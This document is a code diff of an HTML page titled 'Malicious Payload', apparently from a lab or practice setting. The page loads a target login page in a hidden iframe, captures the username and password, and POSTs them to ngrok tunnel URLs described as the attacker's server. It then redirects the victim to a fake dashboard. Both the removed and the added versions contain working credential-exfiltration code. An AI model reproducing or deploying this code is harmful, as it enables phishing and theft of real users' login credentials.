@@ -6,43 +6,36 @@
     <title>Malicious Payload</title>
 </head>
 <body>
-    <h1>Loading...This may take a while</h1>
+    <h1>Loading...</h1>
     <p>If you see this message, something went wrong.</p>
 
     <script>
         // Create an invisible iframe to load the target login page
         const iframe = document.createElement("iframe");
         iframe.style.display = "none";
-        iframe.src = "http://localhost:8080"; // Update with the correct path to the target page
+        iframe.src = "http://localhost:8080/target.html"; // Ensure target.html is accessible here
         document.body.appendChild(iframe);
 
-        iframe.onload = function() {
-            try {
-                const iframeDoc = iframe.contentWindow.document;
+        // Set up a message event listener for communication from the iframe
+        window.addEventListener("message", function(event) {
+            if (event.origin !== "http://localhost:8080") return; // Secure the origin check
 
-                // Wait until the form is loaded
-                const loginForm = iframeDoc.getElementById("loginForm");
-                loginForm.addEventListener("submit", function(event) {
-                    event.preventDefault(); // Prevents the actual form submission
-                    const username = iframeDoc.getElementById("username").value;
-                    const password = iframeDoc.getElementById("password").value;
-
-                    // Send the captured credentials to the attacker’s server
-                    fetch("https://2f89-186-96-33-84.ngrok-free.app/", {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/x-www-form-urlencoded"
-                        },
-                        body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
-                    }).then(() => {
-                        // After capturing, redirect to the fake dashboard page to complete the illusion
-                        iframeDoc.location.href = "dashboard.html";
-                    });
+            // Process received data
+            const { username, password } = event.data;
+            if (username && password) {
+                fetch("https://921b-186-96-33-84.ngrok-free.app", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "ngrok-skip-browser-warning": "true"  // Skip ngrok warning
+                    },
+                    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+                }).then(() => {
+                    // Redirect to the fake dashboard page
+                    window.location.href = "http://localhost:8080/dashboard.html";
                 });
-            } catch (error) {
-                console.error("Could not access the target's data. Possible cross-origin restriction:", error);
             }
-        };
+        });
     </script>
 </body>
 </html>
